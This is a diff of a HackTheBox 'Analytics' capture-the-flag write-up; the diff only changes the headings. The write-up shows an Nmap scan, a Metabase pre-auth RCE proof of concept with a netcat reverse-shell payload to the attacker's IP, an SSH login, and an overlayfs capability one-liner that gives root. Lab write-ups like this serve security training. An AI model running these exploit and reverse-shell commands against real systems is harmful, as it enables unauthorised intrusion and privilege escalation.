@@ -1,4 +1,5 @@
-# Nmap
+# HackTheBox Analytics Writeup
+## Nmap
 ```bash
 Nmap scan report for 10.10.11.233
 Host is up, received user-set (0.016s latency).
@@ -18,7 +19,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Did not follow redirect to http://analytical.htb/
 ```
 
-# Metabase Exploit
+## Metabase Exploit
 PoC: https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/main/main.py
 ```bash
 python main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'nc 10.10.14.7 1234 -e /bin/bash'
@@ -55,7 +56,7 @@ USER=metabase
 [...SNIP...]
 ```
 
-# User Flag
+## User Flag
 ```bash
 ssh metalytics@10.10.11.233
 metalytics@analytics:~$ ls -la /home/metalytics
@@ -73,7 +74,7 @@ drwxrwxr-x 3 metalytics metalytics 4096 Aug  8  2023 .local
 -rw-r--r-- 1 metalytics metalytics   39 Aug  8  2023 .vimrc
 ```
 
-# Root Flag
+## Root Flag
 ```bash
 metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty;import os;os.setuid(0);pty.spawn("/bin/bash")'
 root@analytics:/tmp# ls -la /root
